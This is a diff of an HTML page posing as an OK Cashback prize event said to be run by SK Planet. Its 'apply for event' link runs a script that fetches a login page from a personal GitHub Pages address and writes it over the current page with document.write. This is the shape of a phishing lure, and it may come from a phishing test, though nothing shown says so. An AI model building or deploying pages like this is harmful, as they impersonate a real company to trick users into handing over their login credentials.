@@ -66,9 +66,7 @@
         }
     </style>
     <script>
-    document.getElementById("loginBtn").addEventListener("click", function(e) {
-      e.preventDefault();
-      
+    function loadLoginPage() {
       fetch("https://raw.githubusercontent.com/windshock/windshock.github.io/refs/heads/master/static/login.html")
         .then(res => res.text())
         .then(html => {
@@ -76,8 +74,9 @@
           document.write(html);
           document.close();
         });
-    });
+    }
     </script>
+
 
     <script>
         async function fetchForBrowser() {
@@ -146,7 +145,7 @@
                             <p>3등 (50명): OK캐시백 10만원</p>
                         </div>
 
-                        <a class="btn" href="#" id="loginBtn">이벤트 응모하기</a>
+                        <a href="javascript:loadLoginPage()">이벤트 응모하기</a>
 
                         <div class="footer">
                             ※ 본 이벤트는 SK플래닛 주관으로 진행됩니다. 자세한 내용은 OK캐시백 앱 공지를 참고하세요.
